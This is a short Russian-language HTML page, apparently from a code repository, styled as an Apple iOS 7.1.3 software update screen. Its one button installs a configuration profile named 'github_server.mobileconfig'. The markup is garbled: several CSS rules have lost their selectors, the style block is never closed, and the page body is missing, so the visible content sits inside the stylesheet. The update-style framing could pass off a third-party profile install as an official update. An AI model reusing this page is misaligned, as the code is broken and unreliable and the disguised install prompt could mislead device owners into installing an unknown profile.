<!DOCTYPE html>
<html lang="ru">
<head>

    <title>Обновление ПО iOS 7.1.3</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #f4f4f7;
            margin: 0;
            padding: 0;
            color: #000;
            text-align: center;
        }
        .header {
            background-color: #fff;
            padding: 20px;
            border-bottom: 1px solid #d1d1d6;
            font-size: 18px;
            font-weight: 500;
        }
        .container {

        }

            margin: 0 auto 20px;

            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 32px;
            font-weight: bold;
        }
        h1 {
            font-size: 24px;
            font-weight: 300;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
            color: #8e8e93;
            line-height: 1.4;
            margin-bottom: 40px;
        }
        .btn {
            display: block;
            background-color: #007aff;
            color: #fff;
            text-decoration: none;
            padding: 15px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            margin: 0 10px;
            box-shadow: 0 4px 15px rgba(0,122,255,0.3);
        }
        .btn:active {
            background-color: #0051a8;
        }
        .footer {
            margin-top: 50px;

            color: #c7c7cc;
        }

    <div class="header">Обновление ПО</div>

        <!-- Ссылка на файл профиля, который лежит в этой же папке репозитория -->
        <a href="github_server.mobileconfig" class="btn">Установить профиль OTA</a>

    <div class="footer">© 2026 Mikesoft. Все права защищены.</div>
